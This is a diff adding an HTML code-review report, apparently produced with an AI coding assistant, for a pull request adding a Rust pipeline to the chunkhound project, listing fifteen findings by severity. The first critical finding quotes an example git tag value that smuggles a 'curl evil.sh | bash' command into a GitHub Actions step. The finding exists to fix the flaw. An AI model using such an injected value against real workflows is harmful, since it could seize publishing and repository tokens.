@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PR #380 Review — Main rust flow — chunkhound/chunkhound</title>
+<style>
+  :root {
+    --bg: #0f1117;
+    --panel: #1a1d27;
+    --panel-alt: #20242f;
+    --border: #2d3344;
+    --text: #e2e8f0;
+    --muted: #94a3b8;
+    --accent: #4299e1;
+    --critical: #f5222d;
+    --high: #fa8c16;
+    --medium: #d4b106;
+    --minor: #52c41a;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    line-height: 1.6;
+    padding-bottom: 70px;
+  }
+  .container { max-width: 980px; margin: 0 auto; padding: 2.5rem 1.5rem; }
+  header.pr-header {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.5rem 1.75rem;
+    margin-bottom: 1.5rem;
+  }
+  header.pr-header h1 { margin: 0 0 .5rem; font-size: 1.5rem; }
+  .pr-meta { color: var(--muted); font-size: .92rem; display: flex; flex-wrap: wrap; gap: 1.25rem; }
+  .pr-meta span strong { color: var(--text); }
+  .branch-flow { font-family: 'SF Mono', Consolas, monospace; color: var(--accent); }
+
+  .recommendation {
+    border-radius: 10px;
+    padding: 1rem 1.5rem;
+    margin-bottom: 1.5rem;
+    font-size: 1.05rem;
+    font-weight: 700;
+    border: 1px solid var(--critical);
+    background: rgba(245, 34, 45, 0.12);
+    color: #ff7875;
+  }
+
+  table.summary {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 2rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+  }
+  table.summary th, table.summary td {
+    padding: .75rem 1.25rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  table.summary th { color: var(--muted); font-size: .85rem; text-transform: uppercase; letter-spacing: .04em; }
+  table.summary tr:last-child td { border-bottom: none; font-weight: 700; }
+
+  nav.toc {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.25rem 1.75rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 { margin-top: 0; font-size: 1.05rem; color: var(--muted); text-transform: uppercase; letter-spacing: .04em; }
+  nav.toc ul { margin: 0; padding-left: 1.25rem; columns: 2; }
+  nav.toc a { color: var(--accent); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+
+  section.sev-group { margin-bottom: 2.25rem; }
+  section.sev-group > h2 {
+    font-size: 1.15rem;
+    padding-bottom: .5rem;
+    border-bottom: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: .6rem;
+  }
+
+  .finding {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--border);
+    border-radius: 8px;
+    padding: 1.1rem 1.3rem;
+    margin-bottom: 1rem;
+    display: flex;
+    gap: .8rem;
+    transition: opacity .15s;
+  }
+  .finding.sev-critical { border-left-color: var(--critical); }
+  .finding.sev-high { border-left-color: var(--high); }
+  .finding.sev-medium { border-left-color: var(--medium); }
+  .finding.sev-minor { border-left-color: var(--minor); }
+  .finding:has(.finding-select:not(:checked)) { opacity: 0.45; }
+
+  .finding-select {
+    appearance: none; -webkit-appearance: none;
+    width: 18px; height: 18px; border-radius: 4px; border: 2px solid #4a5568;
+    background: #12141c; cursor: pointer; flex-shrink: 0; margin-top: 3px;
+    position: relative; transition: background .15s, border-color .15s;
+  }
+  .finding-select:checked { background: var(--accent); border-color: var(--accent); }
+  .finding-select:checked::after {
+    content: '✓'; position: absolute; top: -1px; left: 2px;
+    font-size: 13px; font-weight: 900; color: #fff;
+  }
+
+  .finding-body { flex: 1; }
+  .finding-head { display: flex; align-items: center; gap: .6rem; flex-wrap: wrap; margin-bottom: .4rem; }
+  .badge {
+    font-size: .72rem; font-weight: 700; text-transform: uppercase; letter-spacing: .03em;
+    padding: .2rem .55rem; border-radius: 4px; color: #1a1d27;
+  }
+  .badge.critical { background: var(--critical); color: #fff; }
+  .badge.high { background: var(--high); color: #1a1d27; }
+  .badge.medium { background: var(--medium); color: #1a1d27; }
+  .badge.minor { background: var(--minor); color: #1a1d27; }
+  .finding-title { font-weight: 600; font-size: 1rem; }
+  code.file-path {
+    font-family: 'SF Mono', Consolas, monospace;
+    background: var(--panel-alt);
+    padding: .15rem .45rem;
+    border-radius: 4px;
+    font-size: .85rem;
+    color: #93c5fd;
+  }
+  .finding-desc { color: #cbd5e1; font-size: .93rem; margin: .5rem 0; }
+  .finding-fix {
+    background: var(--panel-alt);
+    border-radius: 6px;
+    padding: .6rem .9rem;
+    margin-top: .5rem;
+    font-size: .87rem;
+  }
+  .finding-fix strong { color: #86efac; }
+
+  .clean-areas {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--minor);
+    border-radius: 8px;
+    padding: 1.1rem 1.3rem;
+    font-size: .93rem;
+    color: #cbd5e1;
+  }
+  .clean-areas h2 { margin-top: 0; font-size: 1.1rem; }
+
+  footer.note { text-align: center; color: var(--muted); font-size: .82rem; margin-top: 2rem; }
+
+  #sel-footer {
+    position: fixed; bottom: 0; left: 0; right: 0;
+    background: #1a1d27; border-top: 2px solid var(--accent);
+    padding: .7rem 2rem; display: flex; align-items: center;
+    justify-content: space-between; gap: 1rem; z-index: 100;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+  }
+  #sel-count { color: #e2e8f0; font-size: .95rem; }
+  #sel-count strong { color: var(--accent); }
+  #sel-copy-btn {
+    background: var(--accent); color: #000; border: none; border-radius: 6px;
+    padding: .45rem 1.1rem; font-weight: 700; font-size: .88rem;
+    cursor: pointer; transition: background .15s;
+  }
+  #sel-copy-btn:hover { background: #63b3ed; }
+  #sel-copy-btn.copied { background: #52c41a; color: #000; }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header class="pr-header">
+    <h1>PR #380 — "Main rust flow"</h1>
+    <div class="pr-meta">
+      <span>Repo: <strong>chunkhound/chunkhound</strong></span>
+      <span>Author: <strong>HananKavitzAmat</strong></span>
+      <span>Branch: <span class="branch-flow">main_rust_flow → main</span></span>
+      <span>State: <strong>OPEN</strong></span>
+      <span>Size: <strong>121 files</strong>, ~22k line diff</span>
+    </div>
+  </header>
+
+  <div class="recommendation">🚫 Request Changes — 2 Critical findings, plus a High-severity data-corruption-risk concurrency gap in the core Python↔Rust pipeline handoff.</div>
+
+  <table class="summary">
+    <tr><th>Severity</th><th>Count</th></tr>
+    <tr><td>🔴 Critical</td><td>2</td></tr>
+    <tr><td>🟠 High</td><td>5</td></tr>
+    <tr><td>🟡 Medium</td><td>4</td></tr>
+    <tr><td>🟢 Minor</td><td>4</td></tr>
+    <tr><td>Total</td><td>15</td></tr>
+  </table>
+
+  <nav class="toc">
+    <h2>Contents</h2>
+    <ul>
+      <li><a href="#critical">Critical (2)</a></li>
+      <li><a href="#high">High (5)</a></li>
+      <li><a href="#medium">Medium (4)</a></li>
+      <li><a href="#minor">Minor (4)</a></li>
+      <li><a href="#clean">Clean areas</a></li>
+    </ul>
+  </nav>
+
+  <section class="sev-group" id="critical">
+    <h2>🔴 Critical</h2>
+
+    <div class="finding sev-critical">
+      <input type="checkbox" class="finding-select" data-id="1" checked title="Include in review comment" aria-label="Include finding 1 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge critical">Critical</span>
+          <span class="finding-title">Command injection via unsanitized <code>${{ inputs.tag }}</code> in new alert action</span>
+        </div>
+        <code class="file-path">.github/actions/alert-native-publish-failure/action.yml:43-45</code>
+        <p class="finding-desc">GitHub Actions substitutes <code>${{ }}</code> as raw text before bash parses the script. <code>inputs.tag</code> comes from <code>github.event.release.tag_name</code> or <code>github.ref_name</code> — a git tag, which may legally contain <code>"</code>, backtick, <code>$()</code>, <code>;</code>, <code>|</code>. A tag like <code>v1.2.0a1"; curl evil.sh | bash; echo "</code> breaks out of the quoted <code>--title</code>/<code>--body</code> args and runs arbitrary shell in a job holding <code>id-token: write</code> (PyPI OIDC trusted publisher) and <code>GH_TOKEN</code>.</p>
+        <div class="finding-fix"><strong>Fix:</strong> pass <code>inputs.tag</code> through <code>env:</code> and reference as a shell variable (<code>env: ALERT_TAG: ${{ inputs.tag }}</code>, then use <code>"${ALERT_TAG}"</code>) — never interpolate the expression directly into the script text.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-critical">
+      <input type="checkbox" class="finding-select" data-id="2" checked title="Include in review comment" aria-label="Include finding 2 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge critical">Critical</span>
+          <span class="finding-title">Crash-self-heal test never compares recovered chunks to the pre-crash baseline</span>
+        </div>
+        <code class="file-path">tests/contracts/test_force_reindex_crash_self_heal.py:29-60</code>
+        <p class="finding-desc">The test captures <code>chunks_before</code> (the known-good baseline), simulates the crash window, reindexes incrementally, then only asserts <code>chunks_after</code> is non-empty — it never compares <code>chunks_after</code> to <code>chunks_before</code> even though the reference value is right there. A partial self-heal (only some dirty files recover, or recovered chunks have wrong content) would still pass.</p>
+        <div class="finding-fix"><strong>Fix:</strong> replace <code>assert chunks_after</code> with an actual multiset-equality assertion against <code>chunks_before</code> (e.g. <code>assert_chunk_multiset_identical</code>).</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="sev-group" id="high">
+    <h2>🟠 High</h2>
+
+    <div class="finding sev-high">
+      <input type="checkbox" class="finding-select" data-id="3" checked title="Include in review comment" aria-label="Include finding 3 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge high">High</span>
+          <span class="finding-title">No guard against a connection reopening on the DB file while Rust holds write ownership</span>
+        </div>
+        <code class="file-path">chunkhound/providers/database/duckdb_provider.py, serial_database_provider.py — release_for_rust_pipeline()</code>
+        <p class="finding-desc">There is no equivalent of the existing <code>is_compaction_in_progress()</code> flag for the Rust-ownership window. The MCP server's search-tool handlers never acquire the <code>_scan_lock</code> that guards background reindexing, so a search request arriving mid-Rust-reindex can lazily open a second <code>duckdb.connect()</code> on the same file Rust is actively writing — risking lock errors or silent on-disk corruption.</p>
+        <div class="finding-fix"><strong>Fix:</strong> add a <code>rust_pipeline_in_progress</code>-style flag mirroring <code>_compaction_in_progress</code>, checked by <code>execute_sync</code>/<code>execute_async</code>.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-high">
+      <input type="checkbox" class="finding-select" data-id="4" checked title="Include in review comment" aria-label="Include finding 4 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge high">High</span>
+          <span class="finding-title">Stale <code>_skip_compaction</code> flag silently skips compaction after a Rust embed-error retry</span>
+        </div>
+        <code class="file-path">chunkhound/services/indexing_coordinator.py, directory_indexing_service.py</code>
+        <p class="finding-desc"><code>_skip_compaction</code> is set once at the top of <code>process_directory()</code> and only reset on the next call. When a Rust run has per-file embed errors, the Python-side retry pass writes new embeddings, then the second compaction boundary call still sees the stale flag from the just-finished Rust run and no-ops — those embeddings never get compacted this session.</p>
+        <div class="finding-fix"><strong>Fix:</strong> reset the flag once the Rust result is consumed, or thread "who owns compaction" through as a local value instead of an instance attribute.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-high">
+      <input type="checkbox" class="finding-select" data-id="5" checked title="Include in review comment" aria-label="Include finding 5 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge high">High</span>
+          <span class="finding-title">Directory-anchored include patterns for unknown extensions are silently dropped</span>
+        </div>
+        <code class="file-path">chunkhound/services/indexing_coordinator.py::_filter_unsupported_extensions, realtime_path_filter.py::should_index</code>
+        <p class="finding-desc">Patterns like <code>src/**/*.proto</code> are silently dropped, contradicting the code's own docstring, which says such explicit requests should always be kept (only blanket <code>**/*</code> wildcards should be gated). A user with <code>"include": ["src/**/*.proto"]</code> gets those files silently never indexed, with no error or skip stat.</p>
+        <div class="finding-fix"><strong>Fix:</strong> only gate truly blanket patterns, not any directory-anchored one.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-high">
+      <input type="checkbox" class="finding-select" data-id="6" checked title="Include in review comment" aria-label="Include finding 6 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge high">High</span>
+          <span class="finding-title">Embed provider/event-loop cache keyed only by OS thread id, never invalidated across pipeline runs</span>
+        </div>
+        <code class="file-path">chunkhound/pipeline_bridge.py::_embed_batch</code>
+        <p class="finding-desc"><code>_embed_providers</code>/<code>_embed_loops</code> module-level caches are keyed by <code>threading.get_ident()</code> and never cleared between separate <code>run_rust_pipeline()</code> calls in the same process. Since thread ids get recycled, a long-lived process (e.g. the MCP server indexing multiple directories) can silently reuse a stale embedding provider/config from an earlier run — no exception, just wrong embeddings.</p>
+        <div class="finding-fix"><strong>Fix:</strong> clear/rebuild these caches per <code>run_rust_pipeline()</code> call, or key by <code>(tid, id(embedding_cfg))</code>.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-high">
+      <input type="checkbox" class="finding-select" data-id="7" checked title="Include in review comment" aria-label="Include finding 7 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge high">High</span>
+          <span class="finding-title">Incremental-update parity tests never check embedding parity, only chunk parity</span>
+        </div>
+        <code class="file-path">tests/contracts/test_incremental_updates.py, test_pipeline_parallel.py</code>
+        <p class="finding-desc">Both tests exercise the incremental/streaming path (highest-risk for the Rust rewrite) but only call <code>assert_chunk_multiset_identical()</code>, never <code>assert_identical()</code> (the helper that also compares embedding vectors) — even though the data needed is already collected. A bug where the Rust incremental path writes a stale/wrong embedding for a modified file would pass both tests undetected.</p>
+        <div class="finding-fix"><strong>Fix:</strong> also assert embedding-tuple multiset equality in both tests, matching the pattern in <code>test_identical_chunks.py</code>.</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="sev-group" id="medium">
+    <h2>🟡 Medium</h2>
+
+    <div class="finding sev-medium">
+      <input type="checkbox" class="finding-select" data-id="8" checked title="Include in review comment" aria-label="Include finding 8 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge medium">Medium</span>
+          <span class="finding-title">Checkpoint failures are silently swallowed before handoff to Rust</span>
+        </div>
+        <code class="file-path">chunkhound/providers/database/duckdb_provider.py::_executor_disconnect</code>
+        <p class="finding-desc">A <code>CHECKPOINT</code> failure during disconnect is caught and only logged, never re-raised; <code>release_for_rust_pipeline()</code> then treats "did not raise" as proof the data is durable before handing the file to Rust. A transient checkpoint failure would silently violate that correctness invariant.</p>
+        <div class="finding-fix"><strong>Fix:</strong> propagate or explicitly verify checkpoint success on this specific path.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-medium">
+      <input type="checkbox" class="finding-select" data-id="9" checked title="Include in review comment" aria-label="Include finding 9 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge medium">Medium</span>
+          <span class="finding-title"><code>get_stats()</code> returns fabricated all-zero stats while Rust owns the DB connection</span>
+        </div>
+        <code class="file-path">chunkhound/services/indexing_coordinator.py::get_stats()</code>
+        <p class="finding-desc">While Rust owns the connection, this returns <code>{"files": 0, "chunks": 0, "embeddings": 0}</code>, indistinguishable from a genuinely empty database. A status-checking caller (e.g. an MCP tool) gets misleading data instead of a busy/indexing signal.</p>
+        <div class="finding-fix"><strong>Fix:</strong> surface an explicit "indexing in progress" status instead of zeros.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-medium">
+      <input type="checkbox" class="finding-select" data-id="10" checked title="Include in review comment" aria-label="Include finding 10 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge medium">Medium</span>
+          <span class="finding-title">Parse pool size frozen on first use, ignoring later config changes</span>
+        </div>
+        <code class="file-path">chunkhound/pipeline_bridge.py::_get_parse_pool</code>
+        <p class="finding-desc">The process-wide <code>ProcessPoolExecutor</code> is sized once from whichever call wins the creation race; changing <code>indexing.max_concurrent</code> afterward is silently ignored for the life of the process. Documented in a docstring but easy to miss operationally in a long-lived server.</p>
+        <div class="finding-fix"><strong>Fix:</strong> document more prominently or support resizing; low priority.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-medium">
+      <input type="checkbox" class="finding-select" data-id="11" checked title="Include in review comment" aria-label="Include finding 11 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge medium">Medium</span>
+          <span class="finding-title">Test name promises more coverage than it delivers</span>
+        </div>
+        <code class="file-path">tests/contracts/test_db_write_failure.py</code>
+        <p class="finding-desc">Named/scoped as if it covers "DB write fails mid-run, previously committed batches preserved," but the test only exercises a directory-can't-be-opened failure before any pipeline thread spawns. The docstring admits the harder mid-run/partial-commit scenario is deferred (no fault-injection seam exists yet), but the test name overstates coverage.</p>
+        <div class="finding-fix"><strong>Fix:</strong> rename to reflect actual scope; track the real mid-run scenario as follow-up work.</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="sev-group" id="minor">
+    <h2>🟢 Minor</h2>
+
+    <div class="finding sev-minor">
+      <input type="checkbox" class="finding-select" data-id="12" checked title="Include in review comment" aria-label="Include finding 12 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge minor">Minor</span>
+          <span class="finding-title">Coordinator state is unprotected shared mutable state (currently safe by convention only)</span>
+        </div>
+        <code class="file-path">chunkhound/services/indexing_coordinator.py</code>
+        <p class="finding-desc"><code>_skip_compaction</code> and related state are safe today only because the one relevant caller (<code>mcp_server/base.py</code>) happens to serialize via <code>_scan_lock</code>. Not exploitable today, but fragile — a future caller could reintroduce a race.</p>
+        <div class="finding-fix"><strong>Fix:</strong> add a comment/assertion documenting the reliance on external serialization.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-minor">
+      <input type="checkbox" class="finding-select" data-id="13" checked title="Include in review comment" aria-label="Include finding 13 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge minor">Minor</span>
+          <span class="finding-title">Latent transaction-atomicity footgun (currently unreachable)</span>
+        </div>
+        <code class="file-path">chunkhound/providers/database/duckdb_provider.py::_executor_run_upsert_contract_step</code>
+        <p class="finding-desc">If ever called with an already-active outer transaction on a table with pre-existing duplicate rows, <code>CREATE UNIQUE INDEX</code> would fail with "Data contains duplicates" and nothing would auto-rollback the outer transaction. Verified unreachable today — no current call site has both conditions — but fragile for future callers.</p>
+        <div class="finding-fix"><strong>Fix:</strong> guard against this combination explicitly rather than relying on all future callers avoiding it.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-minor">
+      <input type="checkbox" class="finding-select" data-id="14" checked title="Include in review comment" aria-label="Include finding 14 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge minor">Minor</span>
+          <span class="finding-title">Docstring/behavior mismatch for connection-pool fallback size</span>
+        </div>
+        <code class="file-path">chunkhound/providers/embeddings/openai_provider.py::_connection_limits</code>
+        <p class="finding-desc">Docstring says the fallback uses <code>RECOMMENDED_CONCURRENCY</code>-sized defaults, but the code hard-codes <code>max(10, requested_concurrency)</code>. Harmless today (10 &gt; <code>RECOMMENDED_CONCURRENCY</code>=8), but would silently under-provision the pool if <code>RECOMMENDED_CONCURRENCY</code> is later raised above 10.</p>
+        <div class="finding-fix"><strong>Fix:</strong> reference <code>cls.RECOMMENDED_CONCURRENCY</code> instead of the literal <code>10</code>.</div>
+      </div>
+    </div>
+
+    <div class="finding sev-minor">
+      <input type="checkbox" class="finding-select" data-id="15" checked title="Include in review comment" aria-label="Include finding 15 in comment">
+      <div class="finding-body">
+        <div class="finding-head">
+          <span class="badge minor">Minor</span>
+          <span class="finding-title">Dedup-logging sets keyed only by model name, process-global</span>
+        </div>
+        <code class="file-path">chunkhound/providers/embeddings/openai_provider.py</code>
+        <p class="finding-desc">Two provider instances for the same model but different config (e.g. different <code>output_dims</code>) in one process means the second instance's diagnostic log line never fires. Logging-only impact — no effect on actual embedding computation.</p>
+        <div class="finding-fix"><strong>Fix:</strong> key the dedup sets by <code>(model, output_dims)</code> or move dedup to instance level.</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="clean-areas" id="clean">
+    <h2>✅ Clean areas</h2>
+    <p>The <strong>Rust core</strong> (<code>src/*.rs</code>, <code>Cargo.toml</code>/<code>Cargo.lock</code>, <code>chunkhound_native/__init__.py</code>) was reviewed in full against the project's Rust safety rules — no <code>unsafe</code> code, no <code>.unwrap()</code> at the PyO3 boundary, no <code>&amp;str</code> borrowed across <code>py.allow_threads()</code>, and CPU/IO work correctly wrapped in <code>allow_threads</code> — and found <strong>fully compliant with no defects</strong>. SQL construction throughout is parameterized with no injection risk. The <strong>CLI/config/embeddings layer</strong> had only the two Minor findings above; its exception hierarchy, embedding-batching, and Protocol-contract changes are all consistent with their consumers.</p>
+  </section>
+
+  <footer class="note">Reviewed by Ariel Vaknin via Claude Code — view-only report, not posted to GitHub.</footer>
+</div>
+
+<div id="sel-footer">
+  <span id="sel-count">Selected: <strong id="sel-num">?</strong> / <span id="sel-total">?</span> findings</span>
+  <div style="display:flex;gap:.7rem;align-items:center;">
+    <button id="sel-all-btn"  style="background:#2d3748;color:#e2e8f0;border:1px solid #4a5568;border-radius:5px;padding:.35rem .8rem;cursor:pointer;font-size:.82rem;">Select all</button>
+    <button id="sel-none-btn" style="background:#2d3748;color:#e2e8f0;border:1px solid #4a5568;border-radius:5px;padding:.35rem .8rem;cursor:pointer;font-size:.82rem;">Deselect all</button>
+    <button id="sel-copy-btn">📋 Copy Selection</button>
+  </div>
+</div>
+<script>
+(function(){
+  const boxes = () => Array.from(document.querySelectorAll('.finding-select'));
+  const numEl = document.getElementById('sel-num');
+  const totEl = document.getElementById('sel-total');
+  const copyBtn = document.getElementById('sel-copy-btn');
+
+  function update(){
+    const all = boxes();
+    const checked = all.filter(b=>b.checked);
+    numEl.textContent = checked.length;
+    totEl.textContent = all.length;
+  }
+
+  document.addEventListener('change', e => { if(e.target.classList.contains('finding-select')) update(); });
+  document.getElementById('sel-all-btn').onclick  = ()=>{ boxes().forEach(b=>b.checked=true);  update(); };
+  document.getElementById('sel-none-btn').onclick = ()=>{ boxes().forEach(b=>b.checked=false); update(); };
+
+  copyBtn.onclick = function(){
+    const checked = boxes().filter(b=>b.checked).map(b=>b.dataset.id);
+    const text = checked.length === boxes().length ? 'all'
+                : checked.length === 0             ? 'none'
+                : checked.join(',');
+    navigator.clipboard.writeText(text).then(()=>{
+      copyBtn.textContent = '✓ Copied!';
+      copyBtn.classList.add('copied');
+      setTimeout(()=>{ copyBtn.textContent='📋 Copy Selection'; copyBtn.classList.remove('copied'); }, 2000);
+    });
+  };
+
+  update();
+})();
+</script>
+</body>
+</html>
